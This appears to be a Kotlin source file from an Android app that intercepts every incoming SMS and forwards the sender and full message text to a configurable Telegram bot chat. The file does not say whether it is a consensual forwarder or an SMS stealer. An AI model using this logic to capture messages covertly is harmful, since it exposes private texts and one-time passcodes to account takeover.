package com.smsbangladesh.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val prefs = context.getSharedPreferences("cfg", Context.MODE_PRIVATE)
        if (!prefs.getBoolean("enabled", true)) return

        val token = prefs.getString("token", "") ?: ""
        val chatId = prefs.getString("chat", "") ?: ""
        if (token.isBlank() || chatId.isBlank()) return

        val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        if (msgs.isNullOrEmpty()) return

        val sender = msgs[0].displayOriginatingAddress ?: "Unknown"
        val body = msgs.joinToString("") { it.messageBody ?: "" }
        val text = "📩 SMS Bangladesh\nFrom: $sender\n\n$body"

        val pending = goAsync()
        Thread {
            try {
                TelegramSender.send(token, chatId, text)
            } finally {
                pending.finish()
            }
        }.start()
    }
}
